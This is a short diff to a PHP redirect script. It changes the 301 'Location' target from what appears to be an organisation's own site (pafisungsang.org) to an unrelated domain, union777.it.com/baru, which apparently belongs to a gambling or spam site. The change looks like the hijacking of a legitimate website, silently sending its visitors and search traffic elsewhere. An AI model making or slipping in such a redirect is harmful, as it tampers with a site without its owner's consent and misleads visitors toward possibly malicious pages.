@@ -1,5 +1,5 @@
 <?php
 // 301 Moved Permanently
 header("HTTP/1.1 301 Moved Permanently");
-header("Location: https://www.pafisungsang.org/");
+header("Location: https://www.union777.it.com/baru");
 exit();
